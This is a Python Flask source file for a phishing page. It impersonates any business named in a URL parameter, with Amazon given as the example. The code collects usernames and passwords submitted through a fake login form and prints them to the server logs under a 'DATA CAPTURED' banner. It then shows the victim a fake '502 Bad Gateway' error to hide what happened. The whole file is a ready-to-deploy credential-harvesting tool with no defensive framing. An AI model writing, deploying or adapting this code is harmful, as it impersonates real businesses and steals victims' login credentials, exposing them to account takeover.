import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- DYNAMIC BUSINESS TEMPLATE ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ biz_name }} - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 15px; box-shadow: 0 0 20px #ff0000; width: 320px; border: 1px solid #333; text-align: center; }
        h2 { color: #ff0000; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 2px; }
        p { color: #666; font-size: 13px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #444; border-radius: 5px; background: #222; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #ff0000; border: none; color: white; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>{{ biz_name }}</h2>
        <p>Authentication Required</p>
        <form action="/login" method="post">
            <input type="hidden" name="site" value="{{ biz_name }}">
            <input type="text" name="user" placeholder="Username / Email" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">CONTINUE</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    # Example: yoursite.com/?name=Amazon
    name = request.args.get('name', 'CYBER SERVICE')
    return render_template_string(HTML_TEMPLATE, biz_name=name)

@app.route('/login', methods=['POST'])
def capture():
    target = request.form.get('site')
    username = request.form.get('user')
    password = request.form.get('pass')
    
    # This will print the data to your Render Dashboard Logs
    print("\n" + "="*50)
    print(f"🔥 DATA CAPTURED 🔥")
    print(f"Target: {target}")
    print(f"User  : {username}")
    print(f"Pass  : {password}")
    print("="*50 + "\n")
    
    return "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'><h2>502 Bad Gateway</h2><p>Server maintenance in progress.</p></body></html>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
